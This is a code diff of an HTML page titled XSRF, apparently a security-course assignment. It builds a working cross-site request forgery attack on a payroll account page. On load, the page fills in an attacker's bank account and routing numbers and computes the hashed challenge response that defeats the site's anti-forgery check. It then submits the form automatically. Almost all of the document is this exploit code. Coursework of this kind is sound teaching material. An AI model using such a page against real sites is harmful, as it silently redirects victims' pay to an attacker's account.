@@ -4,30 +4,44 @@
     <meta charset="UTF-8" />
     <title>XSRF</title>
   </head>
-  <body onload="document.forms[0].submit()">
+  <body onload="onLoadHandle()">
     <form action="http://payroll.gatech.edu/account.php" onsubmit="" method="POST">
     <!--
       Your exploits here
       You may also want to change some form attributes
     -->
-    <input id="account" type="number" name="account" value="2060952904">
-    <input id="route" type="number" name="route" value="2958791681">
+      <input id="account" type="number" name="account" value="2060952904" />
+      <input id="route" type="number" name="routing" value="2958791681" />
+      <input id="csrfc" type="hidden" name="challenge" value="615739783">
+      <input id="csrfr" type="hidden" name="response" value="">
+      <input type="hidden" name="action" value="save" />
     </form>
-  </body>
-</html>
-<!DOCTYPE html>
-<html>
-  <head>
-    <meta charset="UTF-8" />
-    <title>XSRF</title>
-  </head>
-  <body onload="document.forms[0].submit()">
-    <form action="" onsubmit="" method="POST">
-    <!--
-      Your exploits here
-      You may also want to change some form attributes
-    -->
-    </form>
-  </body>
-</html>
+    <script>
 
+// fairly trivial string hashing function
+String.prototype.hashCode = function(){
+  var hash = 1;
+  for (i = 0; i < this.length; i++) {
+	hash = (13347 * hash + this.charCodeAt(i)) % 100000;
+  }
+  return hash;
+}
+
+var a = document.getElementById('account');
+var r = document.getElementById('route');
+function change() {
+	var challenge = document.getElementById('csrfc').value;
+	document.getElementById('csrfr').value = (a.value+challenge+r.value).hashCode()
+}
+a.onkeyup = change;
+r.onkeyup = change;
+//change();
+
+function onLoadHandle() {
+  change();
+  document.forms[0].submit();
+console.log(document.getElementById('csrfr').value );
+}
+    </script>
+  </body>
+</html>
